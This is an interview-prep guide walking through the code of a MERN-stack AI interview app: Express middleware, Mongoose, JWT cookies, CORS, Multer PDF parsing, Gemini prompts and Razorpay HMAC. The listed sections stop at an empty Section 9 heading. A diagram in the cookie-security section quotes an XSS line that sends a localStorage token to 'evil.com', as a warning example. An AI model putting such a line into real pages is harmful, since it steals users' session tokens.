# 🧠 InterviewIQ — Deep Concept Interview Prep Guide

> **Purpose:** This is NOT just Q&A — this guide teaches you the **WHY** behind every line of code.
> If you copied from a tutorial, read this cover to cover. After this, you'll **own** every concept.

---

## 📋 Table of Contents

1. [Section 1: How the Internet Works (Foundation)](#section-1-how-the-internet-works)
2. [Section 2: Node.js & Express — Backend Fundamentals](#section-2-nodejs--express)
3. [Section 3: MongoDB & Mongoose — Database Layer](#section-3-mongodb--mongoose)
4. [Section 4: Authentication — JWT & Cookies Deep Dive](#section-4-authentication--jwt--cookies)
5. [Section 5: Middleware — The Backbone of Express](#section-5-middleware--the-backbone-of-express)
6. [Section 6: File Upload — Multer & PDF Parsing](#section-6-file-upload--multer--pdf-parsing)
7. [Section 7: AI Integration — Gemini API & Prompt Engineering](#section-7-ai-integration--gemini-api--prompt-engineering)
8. [Section 8: Payment Integration — Razorpay & HMAC](#section-8-payment-integration--razorpay--hmac)
9. [Section 9: React & Frontend Architecture](#section-9-react--frontend-architecture)
10. [Section 10: Redux Toolkit — State Management](#section-10-redux-toolkit--state-management)
11. [Section 11: Complete Data Flow — End to End](#section-11-complete-data-flow--end-to-end)
12. [Section 12: System Design & Architecture](#section-12-system-design--architecture)
13. [Section 13: Error Handling & Edge Cases](#section-13-error-handling--edge-cases)
14. [Section 14: Deployment & Environment](#section-14-deployment--environment)
15. [Section 15: Tricky Interviewer Questions](#section-15-tricky-interviewer-questions)
16. [Section 16: Architecture — Interview Q&A (Full Deep Dive)](#section-16-architecture--interview-qa-full-deep-dive)
17. [Section 17: Gemini / AI — Interview Q&A (Complete Deep Dive)](#section-17-gemini--ai--interview-qa-complete-deep-dive)
18. [Section 18: Authentication — Interview Q&A (Deep Dive)](#section-18-authentication--interview-qa-deep-dive)
19. [Section 19: Backend & Database — Interview Q&A (Deep Dive)](#section-19-backend--database--interview-qa-deep-dive)
20. [Section 20: Frontend & React — Interview Q&A (Deep Dive)](#section-20-frontend--react--interview-qa-deep-dive)
21. [Section 21: Payments (Razorpay) — Interview Q&A (Deep Dive)](#section-21-payments-razorpay--interview-qa-deep-dive)
22. [Section 22: Challenges, DevOps & Future — Interview Q&A (Deep Dive)](#section-22-challenges-devops--future--interview-qa-deep-dive)

---

## Section 1: How the Internet Works

> Before talking about your project, understand what happens when a user opens your app.

### ❓ Q: What happens when a user types your URL into the browser?

**Answer (teach yourself this):**

```
User types URL → Browser does DNS lookup → Gets IP address → 
TCP connection (3-way handshake) → HTTP request sent → 
Server processes → HTTP response returned → Browser renders HTML/CSS/JS
```

```mermaid
sequenceDiagram
    participant User as 🧑 User Browser
    participant DNS as 🌐 DNS Server
    participant Server as 🖥️ Render Server
    participant DB as 🗄️ MongoDB Atlas

    User->>DNS: What is the IP of interviewiq.onrender.com?
    DNS-->>User: IP is 13.232.xx.xx
    User->>Server: GET / (HTTP Request)
    Server-->>User: index.html + JS bundle (React app)
    User->>User: React renders UI in browser
    User->>Server: GET /api/user/current-user (with cookie)
    Server->>DB: Find user by ID from JWT
    DB-->>Server: User document
    Server-->>User: { name, email, credits }
```

**Concept to understand:** Your React app (frontend) is a **static bundle of files** — HTML, CSS, JS. Once downloaded, it runs entirely in the user's browser. The backend (Express server) is a separate process running on Render that only handles API calls.

### ❓ Q: What is the difference between Client and Server?

| Aspect | Client (React App) | Server (Express API) |
|---|---|---|
| **Runs where?** | User's browser | Render's cloud machine |
| **Language** | JavaScript (React) | JavaScript (Node.js) |
| **Can access DB?** | ❌ Never | ✅ Yes, via Mongoose |
| **Can access files?** | ❌ No file system | ✅ Yes (fs module) |
| **Stores secrets?** | ❌ Never store API keys | ✅ In .env files |
| **Communicates via** | HTTP requests (Axios) | HTTP responses (Express) |

**Why this matters:** A common mistake in interviews is confusing what runs where. Your Gemini API key is on the server because if you put it in React, anyone can open DevTools → Network tab and steal it.

---

## Section 2: Node.js & Express

### ❓ Q: What is Node.js? Why do we need it?

**The real answer (not the textbook one):**

JavaScript was created to run ONLY inside browsers. Node.js is a **runtime** that lets you run JavaScript outside the browser — on a server, on your laptop, anywhere.

```
Browser JavaScript → Can manipulate DOM, show alerts, handle clicks
Node.js JavaScript → Can read files, connect to databases, run HTTP servers
```

**In your project:** Your `server/index.js` uses Node.js to:
- Run an HTTP server (`app.listen(PORT)`)
- Read PDF files (`fs.promises.readFile`)
- Connect to MongoDB (`mongoose.connect`)
- Call the Gemini API (`axios.post`)

None of these would be possible in browser JavaScript.

### ❓ Q: What is Express.js and why not just use raw Node.js?

**Answer:**

Raw Node.js can create HTTP servers but it's painful:

```js
// Without Express (raw Node.js) — You'd have to do this:
const http = require('http');
const server = http.createServer((req, res) => {
    if (req.method === 'POST' && req.url === '/api/auth/google') {
        let body = '';
        req.on('data', chunk => { body += chunk; });
        req.on('end', () => {
            const parsed = JSON.parse(body);
            // ... handle auth
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({success: true}));
        });
    }
    // Repeat for EVERY route...
});
```

```js
// With Express — Clean and structured:
app.post('/api/auth/google', (req, res) => {
    const { name, email } = req.body;  // Express parses JSON for you
    res.json({ success: true });        // Express sets headers for you
});
```

**Express gives you:**
1. **Routing** — `app.get()`, `app.post()` instead of `if/else` chains
2. **Middleware** — Functions that process requests before your controller
3. **JSON parsing** — `app.use(express.json())` parses request bodies automatically
4. **Cookie parsing** — `app.use(cookieParser())` reads cookies from headers

### ❓ Q: Walk me through your `server/index.js` line by line

```js
import express from "express"         // Import the Express framework
import dotenv from "dotenv"           // Load .env file into process.env
import connectDb from "./config/connectDb.js"  // Our DB connection function
import cookieParser from "cookie-parser"       // Parses cookies from request headers
dotenv.config()                       // Actually reads .env and loads variables
import cors from "cors"               // Handles Cross-Origin Resource Sharing

// Import route handlers
import authRouter from "./routes/auth.route.js"
import userRouter from "./routes/user.route.js"
import interviewRouter from "./routes/interview.route.js"
import paymentRouter from "./routes/payment.route.js"

const app = express()                 // Create an Express application instance

// CORS: Allow frontend domain to make requests to this server
app.use(cors({
    origin: "https://interviewiq-ai-interview-agent-1.onrender.com",
    credentials: true    // Allow cookies to be sent cross-origin
}))

app.use(express.json())    // Parse JSON request bodies automatically
app.use(cookieParser())    // Parse cookies from every incoming request

// Mount route groups — Each handles a different concern
app.use("/api/auth", authRouter)          // Login/Logout
app.use("/api/user", userRouter)          // Get current user
app.use("/api/interview", interviewRouter) // Interview operations
app.use("/api/payment", paymentRouter)     // Payment processing

const PORT = process.env.PORT || 6000
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`)
    connectDb()   // Connect to MongoDB AFTER server starts
})
```

**Flow of a request through this file:**

```mermaid
flowchart TD
    A["🌐 HTTP Request arrives"] --> B["cors() — Is this origin allowed?"]
    B -->|"Yes"| C["express.json() — Parse JSON body"]
    C --> D["cookieParser() — Parse cookies"]
    D --> E{"Which URL path?"}
    E -->|"/api/auth/*"| F["authRouter"]
    E -->|"/api/user/*"| G["userRouter"]
    E -->|"/api/interview/*"| H["interviewRouter"]
    E -->|"/api/payment/*"| I["paymentRouter"]
    F --> J["Controller function handles logic"]
    G --> J
    H --> J
    I --> J
    J --> K["📤 Response sent back to client"]
```

### ❓ Q: What does `app.use()` do?

**Answer:** `app.use()` registers a **middleware** — a function that runs on EVERY incoming request (or every request matching a path). Think of it like a **security checkpoint** at an airport:

```
Request comes in
  → Goes through cors() checkpoint
    → Goes through express.json() checkpoint
      → Goes through cookieParser() checkpoint
        → Goes to the matching route handler
```

Each middleware can:
1. **Modify the request** (e.g., `express.json()` adds `req.body`)
2. **Modify the response** (e.g., `cors()` adds CORS headers)
3. **Block the request** (e.g., `isAuth` returns 401 if no token)
4. **Call `next()`** to pass to the next middleware

---

## Section 3: MongoDB & Mongoose

### ❓ Q: What is MongoDB and how is it different from MySQL?

**The real understanding:**

| Feature | MongoDB (Your Project) | MySQL (Relational) |
|---|---|---|
| **Data format** | JSON-like documents | Tables with rows/columns |
| **Schema** | Flexible (can add fields anytime) | Rigid (must ALTER TABLE) |
| **Relationships** | Embed documents or reference by ID | JOIN tables with foreign keys |
| **Query language** | `Model.find({ email })` | `SELECT * FROM users WHERE email = ?` |
| **Best for** | Rapid prototyping, varied data shapes | Banking, strict data integrity |

**Example — How your User looks in MongoDB vs MySQL:**

```js
// MongoDB document (stored as BSON, looks like JSON):
{
    "_id": ObjectId("507f1f77bcf86cd799439011"),
    "name": "Siddhesh",
    "email": "sid@gmail.com",
    "credits": 100,
    "createdAt": "2026-09-20T10:30:00.000Z",
    "updatedAt": "2026-09-20T10:30:00.000Z"
}

// MySQL row (flat table):
// | id | name      | email          | credits | created_at         |
// | 1  | Siddhesh  | sid@gmail.com  | 100     | 2026-09-20 10:30   |
```

### ❓ Q: What is Mongoose and why not use MongoDB driver directly?

**Answer:** Mongoose is an **ODM (Object Document Mapper)** — it sits between your code and MongoDB:

```mermaid
flowchart LR
    A["Your Code"] -->|"User.findById(id)"| B["Mongoose ODM"]
    B -->|"Validates schema\nCasts types\nApplies defaults"| C["MongoDB Driver"]
    C -->|"Raw BSON query"| D["MongoDB Server"]
```

**Without Mongoose** (raw driver):
```js
const { MongoClient } = require('mongodb');
const client = new MongoClient(uri);
const db = client.db('interviewiq');
const users = db.collection('users');

// No validation — MongoDB accepts ANYTHING:
await users.insertOne({ name: 123, email: null, credits: "abc" }); // No error!
```

**With Mongoose** (your project):
```js
const userSchema = new mongoose.Schema({
    name: { type: String, required: true },    // Must be a string, must exist
    email: { type: String, unique: true, required: true },  // Must be unique
    credits: { type: Number, default: 100 }    // Auto-set to 100 if missing
}, { timestamps: true });                       // Auto-add createdAt/updatedAt

// Now Mongoose enforces rules:
await User.create({ name: 123 });  // Error! name must be String
await User.create({});             // Error! name and email are required
await User.create({ name: "Sid", email: "sid@gmail.com" }); // Works! credits=100 auto
```

### ❓ Q: Explain the Interview Schema — why embedded sub-documents?

**Your actual code in `interview.model.js`:**

```js
const questionsSchema = new mongoose.Schema({
    question: String,           // "Explain how React hooks work"
    difficulty: String,         // "easy" | "medium" | "hard"
    timeLimit: Number,          // 60 | 90 | 120 seconds
    answer: String,             // User's answer text
    feedback: String,           // AI feedback "Good explanation, add examples"
    score: { type: Number, default: 0 },       // 0-10
    confidence: { type: Number, default: 0 },   // 0-10
    communication: { type: Number, default: 0 }, // 0-10
    correctness: { type: Number, default: 0 },   // 0-10
})

const interviewSchema = new mongoose.Schema({
    userId: { type: mongoose.Schema.Types.ObjectId, ref: "User" },
    role: String,
    experience: String,
    mode: { type: String, enum: ["HR", "Technical"] },
    resumeText: String,
    questions: [questionsSchema],    // ← EMBEDDED array of sub-documents
    finalScore: { type: Number, default: 0 },
    status: { type: String, enum: ["Incompleted", "completed"], default: "Incompleted" }
}, { timestamps: true })
```

**Why embedding instead of a separate Questions collection?**

```mermaid
flowchart TD
    subgraph "❌ Separate Collection (Wrong for this case)"
        A1["interviews collection"] -.->|"Need a JOIN/populate for every read"| B1["questions collection"]
        C1["Interview.findById(id).populate('questions')"]
        C1 --> D1["2 database queries every time = SLOW"]
    end
    
    subgraph "✅ Embedded Documents (Your Design)"
        A2["interviews collection<br/>each doc has questions[] inside it"]
        C2["Interview.findById(id)"]
        C2 --> D2["1 database query = FAST"]
    end
```

**Rule of thumb:**
- **Embed** when child data is always accessed with the parent → Interview questions are NEVER read alone
- **Reference** when child data is shared or queried independently → Users are referenced by ID because a user can have many interviews

### ❓ Q: What does `{ timestamps: true }` do?

When you add `{ timestamps: true }` to a Mongoose schema:
- Mongoose automatically adds `createdAt` and `updatedAt` fields
- `createdAt` is set once when the document is created
- `updatedAt` is updated every time you call `.save()` or `.findByIdAndUpdate()`

This is why you can do `.sort({ createdAt: -1 })` in `getMyInterviews` — it sorts newest first.

### ❓ Q: What is `ObjectId` and why is `userId` typed as `mongoose.Schema.Types.ObjectId`?

**Answer:** Every MongoDB document gets a unique `_id` which is an `ObjectId` — a 12-byte identifier that looks like `"507f1f77bcf86cd799439011"`. When we write:

```js
userId: { type: mongoose.Schema.Types.ObjectId, ref: "User" }
```

We're saying:
1. `userId` stores an ObjectId (not a string, not a number)
2. `ref: "User"` tells Mongoose: "This ID points to a document in the User collection"
3. This enables `.populate('userId')` if needed — Mongoose would auto-fetch the full User document

---

## Section 4: Authentication — JWT & Cookies

### ❓ Q: What is JWT? Explain like I know nothing.

**JWT = JSON Web Token.** It's a way to prove "I am logged in" without the server remembering you.

**The problem it solves:**

```
Traditional Sessions (Stateful):
Server stores session data in memory/database
  → User logs in → Server creates session → Gives session ID
  → Every request: Server looks up session ID in its memory
  → Problem: If server restarts or you have multiple servers, sessions are lost!

JWT (Stateless):
Server doesn't store anything!
  → User logs in → Server creates a SIGNED token → Gives it to client
  → Every request: Client sends token → Server VERIFIES the signature
  → No database lookup needed!
```

**Structure of a JWT:**

```
eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI2NzIifQ.abc123signature
|_______HEADER_______|._______PAYLOAD_________|.__SIGNATURE___|
```

```mermaid
flowchart LR
    subgraph "JWT Structure"
        A["Header<br/>{ alg: 'HS256', typ: 'JWT' }"] 
        B["Payload<br/>{ userId: '672...', exp: ... }"]
        C["Signature<br/>HMAC-SHA256(header + payload, SECRET)"]
    end
    A --> D["Base64 encode"]
    B --> D
    D --> E["Combined with dots: header.payload"]
    E --> F["Sign with JWT_SECRET"]
    F --> C
```

**Your code in `config/token.js`:**

```js
const genToken = async (userId) => {
    const token = jwt.sign(
        { userId },              // Payload — what data to embed in the token
        process.env.JWT_SECRET,  // Secret key — ONLY your server knows this
        { expiresIn: "7d" }      // Token dies after 7 days
    )
    return token
}
```

**How verification works in `middlewares/isAuth.js`:**

```js
const isAuth = async (req, res, next) => {
    let { token } = req.cookies          // Step 1: Extract token from cookie
    
    if (!token) {
        return res.status(400).json({ message: "user does not have a token" })
    }
    
    const verifyToken = jwt.verify(      // Step 2: Verify signature
        token,
        process.env.JWT_SECRET           // Same secret used to sign
    )
    // If signature is invalid or token expired → jwt.verify() THROWS an error
    // The catch block handles it
    
    req.userId = verifyToken.userId      // Step 3: Attach userId to request
    next()                               // Step 4: Allow request to continue
}
```

```mermaid
flowchart TD
    A["🌐 Request: POST /api/interview/generate-questions"] --> B["isAuth middleware"]
    B --> C{"Does req.cookies.token exist?"}
    C -->|"No"| D["❌ 400: No token"]
    C -->|"Yes"| E["jwt.verify(token, JWT_SECRET)"]
    E -->|"Invalid/Expired"| F["❌ 500: Invalid token"]
    E -->|"Valid"| G["Extract userId from payload"]
    G --> H["req.userId = '672abc...'"]
    H --> I["next() → Controller runs"]
    I --> J["Controller uses req.userId to find user in DB"]
```

### ❓ Q: Why HTTP-only cookies? Why not localStorage?

**This is a CRITICAL security question. Understand this deeply:**

```mermaid
flowchart TD
    subgraph "❌ localStorage — Vulnerable to XSS"
        A1["Token stored in localStorage"]
        B1["Malicious script injected via XSS:<br/>fetch('evil.com/steal?token=' + localStorage.getItem('token'))"]
        C1["🔴 Attacker gets your token!"]
        A1 --> B1 --> C1
    end
    
    subgraph "✅ HTTP-only Cookie — Safe from XSS"
        A2["Token stored in HTTP-only cookie"]
        B2["JavaScript CANNOT access it:<br/>document.cookie → '' (empty!)"]
        C2["🟢 Browser sends it automatically with every request"]
        A2 --> B2
        A2 --> C2
    end
```

**Your code sets the cookie in `auth.controller.js`:**

```js
res.cookie("token", token, {
    http: true,        // ⚠️ Bug: Should be "httpOnly: true"
    secure: true,      // Only send over HTTPS
    sameSite: "none",  // Allow cross-origin (frontend ≠ backend domain)
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days in milliseconds
})
```

> ⚠️ **Bug in your code:** `http: true` should be `httpOnly: true`. The property name is `httpOnly` (camelCase). With `http: true`, the cookie might not actually be HTTP-only. This is something an interviewer could catch!

### ❓ Q: What is CORS and why do you need `credentials: true`?

**CORS = Cross-Origin Resource Sharing**

**The problem:** Browsers block requests between different origins for security.

```
Your frontend: https://interviewiq-ai-interview-agent-1.onrender.com
Your backend:  https://interviewiq-ai-interview-agent.onrender.com
                                                    ↑ Different subdomain = Different origin!
```

Without CORS configuration, the browser would BLOCK all Axios requests from frontend to backend.

```js
// Server-side: "Hey browser, this specific frontend is allowed to talk to me"
app.use(cors({
    origin: "https://interviewiq-ai-interview-agent-1.onrender.com",
    credentials: true   // "Also allow cookies to be sent"
}))

// Client-side: "Hey browser, include my cookies when talking to this server"
axios.post(url, data, { withCredentials: true })
```

**Both sides must agree.** If the server says `credentials: true` but the client doesn't use `withCredentials: true`, cookies won't be sent.

---

## Section 5: Middleware — The Backbone of Express

### ❓ Q: What is middleware? Explain with a real-world analogy.

**Answer:** Middleware is like an **assembly line in a factory.** Each station does one job and passes the product to the next station:

```mermaid
flowchart LR
    A["📩 Raw Request"] --> B["cors()<br/>Check if origin allowed"]
    B --> C["express.json()<br/>Parse JSON body"]
    C --> D["cookieParser()<br/>Parse cookies"]
    D --> E["isAuth()<br/>Verify JWT token"]
    E --> F["multer()<br/>Handle file upload"]
    F --> G["🎯 Controller<br/>Business logic"]
    G --> H["📤 Response"]
```

**Every middleware has this signature:**

```js
function myMiddleware(req, res, next) {
    // Do something with req or res
    // Then either:
    next();                          // Pass to next middleware
    // OR
    res.status(400).json({...});     // Stop the chain and respond
}
```

### ❓ Q: Walk through the middleware chain for `POST /api/interview/resume`

This route has the most middleware. Let's trace it from your `interview.route.js`:

```js
interviewRouter.post("/resume", isAuth, upload.single("resume"), analyzeResume)
//                               ^^^^    ^^^^^^^^^^^^^^^^^^^^^    ^^^^^^^^^^^^^
//                               MW 1    MW 2 (Multer)           Controller
```

```mermaid
sequenceDiagram
    participant Client as 🌐 Browser
    participant CORS as cors()
    participant JSON as express.json()
    participant Cookie as cookieParser()
    participant Auth as isAuth
    participant Multer as upload.single("resume")
    participant Controller as analyzeResume()

    Client->>CORS: POST /api/interview/resume
    Note right of CORS: Check origin header
    CORS->>JSON: next()
    Note right of JSON: Parse body (but file is FormData, not JSON)
    JSON->>Cookie: next()
    Note right of Cookie: Extract token from Cookie header
    Cookie->>Auth: next()
    Note right of Auth: Verify JWT → attach req.userId
    Auth->>Multer: next()
    Note right of Multer: Save uploaded PDF to /public folder<br/>Attach file info to req.file
    Multer->>Controller: next()
    Note right of Controller: Read PDF → Parse → Call Gemini → Respond
```

### ❓ Q: How does your Multer middleware work?

**From your `middlewares/multer.js`:**

```js
const storage = multer.diskStorage({
    destination: function(req, file, cb) {
        cb(null, "public")                        // Save files to /public folder
    },
    filename: function(req, file, cb) {
        const filename = Date.now() + "-" + file.originalname;  // Unique name
        cb(null, filename)                         // e.g., "1695312000000-resume.pdf"
    }
})

export const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 },  // Max 5MB
});
```

**What `upload.single("resume")` does:**
1. Reads the multipart/form-data request body
2. Finds the field named `"resume"` (matches `formdata.append("resume", file)` on frontend)
3. Saves the file to disk at `public/1695312000000-resume.pdf`
4. Attaches `req.file` with metadata:
   ```js
   req.file = {
       fieldname: 'resume',
       originalname: 'my_resume.pdf',
       path: 'public/1695312000000-resume.pdf',
       size: 245760,
       mimetype: 'application/pdf'
   }
   ```

**Why `diskStorage` instead of `memoryStorage`?**
- `diskStorage` saves to disk → `pdfjs-dist` reads from disk path
- `memoryStorage` keeps in RAM → Faster but uses more memory; would need `req.file.buffer` instead

---

## Section 6: File Upload — Multer & PDF Parsing

### ❓ Q: Walk me through the complete PDF upload and parsing flow

```mermaid
flowchart TD
    A["👤 User selects PDF file"] --> B["Frontend: new FormData()<br/>formdata.append('resume', file)"]
    B --> C["axios.post('/api/interview/resume', formdata)"]
    C --> D["Server: Multer saves PDF to /public/"]
    D --> E["fs.promises.readFile(filepath)"]
    E --> F["Convert Buffer → Uint8Array"]
    F --> G["pdfjsLib.getDocument({ data: uint8Array })"]
    G --> H["Loop through pages with Promise.all()"]
    H --> I["Extract text from each page"]
    I --> J["Sanitize: remove extra whitespace"]
    J --> K["Send to Gemini API with system prompt"]
    K --> L["Gemini returns JSON: role, skills, projects, experience"]
    L --> M["fs.unlinkSync(filepath) — DELETE the file!"]
    M --> N["Send parsed data back to frontend"]
```

**Your actual code explained piece by piece:**

```js
// Step 1: Read the file from disk into memory
const fileBuffer = await fs.promises.readFile(filepath)
// fileBuffer is a Node.js Buffer — a chunk of binary data

// Step 2: Convert to Uint8Array (pdfjs-dist requires this specific type)
const uint8Array = new Uint8Array(fileBuffer)
// Why? pdfjs-dist is a browser-first library. In browsers, file data comes
// as ArrayBuffer/Uint8Array. The Node.js version keeps the same API.

// Step 3: Load the PDF document
const pdf = await pdfjsLib.getDocument({ data: uint8Array }).promise;
// pdf.numPages tells us how many pages the resume has

// Step 4: Extract text from ALL pages CONCURRENTLY
const pagePromises = [];
for (let pageNum = 1; pageNum <= pdf.numPages; pageNum++) {
    pagePromises.push(
        pdf.getPage(pageNum).then(async (page) => {
            const content = await page.getTextContent();
            return content.items.map(item => item.str).join(" ");
        })
    );
}
const pagesText = await Promise.all(pagePromises);  // All pages at once!
resumeText = pagesText.join("\n");
```

### ❓ Q: Why use `Promise.all()` for PDF pages? What's the difference?

```mermaid
flowchart TD
    subgraph "❌ Sequential (Slow)"
        A1["Page 1: 200ms"] --> B1["Page 2: 200ms"] --> C1["Page 3: 200ms"]
        C1 --> D1["Total: 600ms"]
    end
    
    subgraph "✅ Concurrent with Promise.all (Fast)"
        A2["Page 1: 200ms"]
        B2["Page 2: 200ms"]
        C2["Page 3: 200ms"]
        A2 --> D2["Total: ~200ms"]
        B2 --> D2
        C2 --> D2
    end
```

**Sequential approach:**
```js
// BAD — Each page waits for the previous one
for (let i = 1; i <= pdf.numPages; i++) {
    const page = await pdf.getPage(i);         // Waits...
    const content = await page.getTextContent(); // Waits...
    resumeText += content.items.map(item => item.str).join(" ");
}
// Total time = sum of all page times
```

**Your concurrent approach:**
```js
// GOOD — All pages start processing immediately
const pagePromises = [];
for (let i = 1; i <= pdf.numPages; i++) {
    pagePromises.push(/* create promise for each page */);
}
await Promise.all(pagePromises);  // Wait for ALL to finish
// Total time = time of the SLOWEST page (not the sum)
```

### ❓ Q: Why delete the PDF immediately after parsing?

```js
// In the success path:
fs.unlinkSync(filepath)  // Delete the file synchronously

// In the error path (catch block):
if (req.file && fs.existsSync(req.file.path)) {
    fs.unlinkSync(req.file.path);  // Still delete even if parsing failed!
}
```

**Two reasons:**
1. **Privacy:** Resumes contain names, phone numbers, addresses. Storing them is a liability.
2. **Disk space:** On Render's free tier, disk space is limited. Uploaded files would accumulate and eventually crash the server.

---

## Section 7: AI Integration — Gemini API & Prompt Engineering

### ❓ Q: How does the Gemini API service work?

**Your `openRouter.service.js` is an abstraction layer:**

```mermaid
flowchart TD
    A["Controller calls askAi(messages)"] --> B["openRouter.service.js"]
    B --> C{"Separate messages by role"}
    C --> D["'system' → systemInstruction"]
    C --> E["'user'/'assistant' → contents array"]
    D --> F["Build Gemini API payload"]
    E --> F
    F --> G["POST to generativelanguage.googleapis.com"]
    G --> H["Extract text from response"]
    H --> I["Return clean text to controller"]
```

**The message format conversion:**

```js
// Your controllers send OpenAI-style messages:
const messages = [
    { role: "system", content: "You are an interviewer..." },
    { role: "user", content: "Resume text here..." }
]

// But Gemini API expects a different format:
{
    systemInstruction: { parts: [{ text: "You are an interviewer..." }] },
    contents: [
        { role: "user", parts: [{ text: "Resume text here..." }] }
    ]
}
```

**Why this abstraction matters:**
- Controllers don't know or care which AI provider is being used
- If you switch from Gemini to OpenAI or Claude, you only change ONE file
- This is called the **Adapter Pattern** — a real design pattern from software engineering

### ❓ Q: Explain Prompt Engineering with your 3 use cases

**Prompt Engineering = carefully crafting instructions for AI to get reliable, structured output.**

#### Use Case 1: Resume Parsing

```js
// SYSTEM prompt — tells the AI HOW to behave:
`Extract structured data from resume.
Return strictly JSON:
{
  "role": "string",
  "experience": "string",
  "projects": ["project1", "project2"],
  "skills": ["skill1", "skill2"]
}`

// USER prompt — the actual data to process:
resumeText  // "John Doe, Software Engineer, 3 years experience..."
```

**Why this works:**
- "Return strictly JSON" — prevents the AI from adding explanatory text
- Providing the exact JSON structure — forces the AI to follow that shape
- No ambiguity — "role" is clear, "experience" is clear

#### Use Case 2: Question Generation

```js
`You are a real human interviewer conducting a professional interview.
Generate exactly 10 interview questions.

Strict Rules:
- Each question must contain between 15 and 25 words.
- Do NOT number them.
- Do NOT add explanations.
- One question per line only.

Difficulty progression:
Questions 1-3 → easy
Questions 4-7 → medium
Questions 8-10 → hard`
```

**Why each rule matters:**
- "exactly 10" — without this, AI might generate 5 or 20
- "15 and 25 words" — prevents one-word or paragraph-long questions
- "Do NOT number them" — because your code splits by `\n` and numbers would break parsing
- "One question per line" — enables the `.split("\n")` parsing strategy
- Difficulty progression — maps to your time limit array `[60,60,60,90,90,90,90,120,120,120]`

#### Use Case 3: Answer Evaluation

```js
`Score the answer in these areas (0 to 10):
1. Confidence
2. Communication  
3. Correctness

Return ONLY valid JSON:
{
  "confidence": number,
  "communication": number,
  "correctness": number,
  "finalScore": number,
  "feedback": "short human feedback"
}`
```

### ❓ Q: How do you handle bad AI output?

**The AI doesn't always follow instructions. Your defense strategy:**

```mermaid
flowchart TD
    A["AI Response received"] --> B["Step 1: Check if response exists"]
    B -->|"Empty/null"| C["❌ Return 500: AI returned empty response"]
    B -->|"Has content"| D["Step 2: Strip markdown code fences"]
    D --> E["response.replace(/```json/g, '').replace(/```/g, '').trim()"]
    E --> F["Step 3: JSON.parse() in try-catch"]
    F -->|"Parse fails"| G["❌ Return 500: Failed to parse AI response"]
    F -->|"Parse succeeds"| H["✅ Use the parsed data"]
```

**Why strip code fences?** Even when you say "Return ONLY valid JSON", AI models sometimes return:

````
```json
{"role": "Software Engineer", "skills": ["React"]}
```
````

The backticks are NOT valid JSON. So you strip them first.

---

## Section 8: Payment Integration — Razorpay & HMAC

### ❓ Q: Explain the complete payment flow

```mermaid
sequenceDiagram
    participant User as 👤 User
    participant Frontend as ⚛️ React
    participant Backend as 🖥️ Express
    participant Razorpay as 💳 Razorpay
    participant DB as 🗄️ MongoDB

    User->>Frontend: Clicks "Buy 500 Credits"
    Frontend->>Backend: POST /api/payment/create-order<br/>{planId, amount: 499, credits: 500}
    Backend->>Razorpay: razorpay.orders.create({amount: 49900, currency: "INR"})
    Note right of Backend: amount * 100 because Razorpay uses paise
    Razorpay-->>Backend: {id: "order_xyz", amount: 49900}
    Backend->>DB: Payment.create({status: "created", razorpayOrderId: "order_xyz"})
    Backend-->>Frontend: {id: "order_xyz", key_id: "rzp_xxx"}
    
    Frontend->>Razorpay: Open Razorpay Checkout Modal
    User->>Razorpay: Enters card details, completes payment
    Razorpay-->>Frontend: {razorpay_order_id, razorpay_payment_id, razorpay_signature}
    
    Frontend->>Backend: POST /api/payment/verify-payment<br/>{razorpay_order_id, razorpay_payment_id, razorpay_signature}
    Backend->>Backend: Compute HMAC-SHA256 signature independently
    Backend->>Backend: Compare computed vs received signature
    
    alt Signatures match ✅
        Backend->>DB: Payment.status = "paid"
        Backend->>DB: User.credits += 500 (using $inc)
        Backend-->>Frontend: {success: true, user: updatedUser}
    else Signatures don't match ❌
        Backend-->>Frontend: {message: "Invalid payment signature"}
    end
```

### ❓ Q: What is HMAC and why is it needed for payments?

**HMAC = Hash-based Message Authentication Code**

Think of it like a **wax seal** on a medieval letter:
- Only the king has the seal (= only Razorpay and your server know the `KEY_SECRET`)
- If the seal is broken, you know someone tampered with the letter

```js
// Razorpay creates this signature:
HMAC-SHA256("order_xyz|pay_abc", KEY_SECRET) = "a1b2c3d4..."

// Your server independently creates the SAME signature:
const body = razorpay_order_id + "|" + razorpay_payment_id;
const expectedSignature = crypto
    .createHmac("sha256", process.env.RAZORPAY_KEY_SECRET)
    .update(body)
    .digest("hex");

// If they match → Payment is genuine
// If they don't → Someone is trying to fake a payment!
```

**Why this is critical:**

Without HMAC verification:
```
🔴 Attacker sends: POST /api/payment/verify-payment
   { razorpay_order_id: "fake", razorpay_payment_id: "fake" }
   → Server would add credits without any real payment!
```

With HMAC verification:
```
🟢 Attacker can't generate the correct signature because
   they don't know your RAZORPAY_KEY_SECRET
   → Request rejected!
```

### ❓ Q: What is `$inc` and why use it instead of regular assignment?

```mermaid
flowchart TD
    subgraph "❌ Read-Modify-Write (Race Condition)"
        A1["User has 100 credits"]
        B1["Payment 1: reads 100"] 
        C1["Payment 2: reads 100"]
        B1 --> D1["Calculates: 100 + 500 = 600"]
        C1 --> E1["Calculates: 100 + 500 = 600"]
        D1 --> F1["Saves: credits = 600"]
        E1 --> G1["Saves: credits = 600"]
        G1 --> H1["❌ Expected 1100, got 600! Lost 500 credits!"]
    end

    subgraph "✅ Atomic $inc (No Race Condition)"
        A2["User has 100 credits"]
        B2["Payment 1: $inc: 500"] 
        C2["Payment 2: $inc: 500"]
        B2 --> D2["MongoDB atomically: 100 + 500 = 600"]
        C2 --> E2["MongoDB atomically: 600 + 500 = 1100"]
        E2 --> F2["✅ Correct! Got 1100"]
    end
```

**Your code:**
```js
// ✅ Atomic — MongoDB handles the increment at the database level
const updatedUser = await User.findByIdAndUpdate(payment.userId, {
    $inc: { credits: payment.credits }
}, { new: true });

// ❌ Non-atomic — Would have race condition
const user = await User.findById(payment.userId);
user.credits = user.credits + payment.credits;  // Read-Modify
await user.save();                                // Write
```

### ❓ Q: How do you prevent double-processing of payments?

**Idempotency check in your code:**

```js
if (payment.status === "paid") {
    return res.json({ message: "Already processed" });
}
```

**Why this matters:** Network retries can cause the same payment to hit your server twice:
1. User pays → Frontend sends verify request → Server processes → Adds credits
2. Network timeout → Frontend retries → Server processes AGAIN → Adds credits AGAIN!

The status check prevents the second addition.

---

## Section 9: React & Frontend Architecture

### ❓ Q: Explain the frontend component architecture

